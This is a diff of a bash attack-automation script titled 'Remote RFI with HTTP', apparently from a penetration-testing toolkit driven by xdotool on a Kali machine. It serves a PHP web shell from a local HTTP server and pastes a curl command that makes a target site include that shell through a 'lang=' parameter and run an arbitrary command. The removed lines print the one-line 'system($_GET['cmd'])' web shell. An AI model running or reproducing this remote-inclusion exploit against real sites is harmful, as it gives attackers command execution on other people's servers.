@@ -4,26 +4,25 @@
 Remote RFI with HTTP
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+WEBSITE_FIELD=$(form_item "website" "website" "http://domain.com/?lang=")
+CMD_FIELD=$(form_item "cmd" "cmd" "whoami")
+PORT_FIELD=$(form_item "http port" "port" "9001")
 
-# Generate gui form
-generate_form "Website" "Cmd"
+# Generate GUI form
+generate_form "${WEBSITE_FIELD}" "${CMD_FIELD}" "${PORT_FIELD}"
 
-WEBSITE=${form_data["Website"]}
-CMD=${form_data["Cmd"]}
+WEBSITE=${form_data["website"]}
+CMD=${form_data["cmd"]}
+PORT=${form_data["port"]}
 
-python3 -m http.server 9001 &
+cd "${SCRIPTS_DIR}/web/lfi/.files"
+python3 -m http.server ${PORT} &
 HTTP_PID=$!
 
-cat << 'EOF' > webShell.php
-<?php system($_GET['cmd']); ?>
-EOF
-
-paste_command "curl -ks '${WEBSITE}http://${KALI_IP}:9001/webShell.php&cmd=${CMD}'"
+paste_command "curl -ks '${WEBSITE}http://${KALI_IP}:${PORT}/webShell.php&cmd=${CMD}'"
 xdotool key Return
-sleep 5
+sleep 60
 
 kill $HTTP_PID
 rm webShell.php
